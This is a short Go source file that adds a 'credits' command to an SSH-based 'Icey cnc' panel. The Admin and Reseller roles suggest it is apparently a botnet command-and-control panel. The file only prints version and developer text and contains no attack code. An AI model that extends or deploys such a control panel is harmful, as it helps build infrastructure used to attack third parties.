package commands

import (
	Sessions "Yami/core/clients/session"
	"Yami/core/models/config"

	"golang.org/x/crypto/ssh"
)

// clear command
func init() {
	Register(&Command{
		Name: "credits",
		Admin: false,
		Reseller: false,

		Descriptions: "Shows credits for Icey cnc!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {
			channel.Write([]byte("Icey cnc - "+Options.ClientVersion+"\r\n"))
			channel.Write([]byte("Icey is a fully custom cnc written by solely "+Options.Devolper+"\r\n"))
			channel.Write([]byte("the cnc contains over 8K Lines of Go code!\r\n"))

			return nil
		},
	})
}
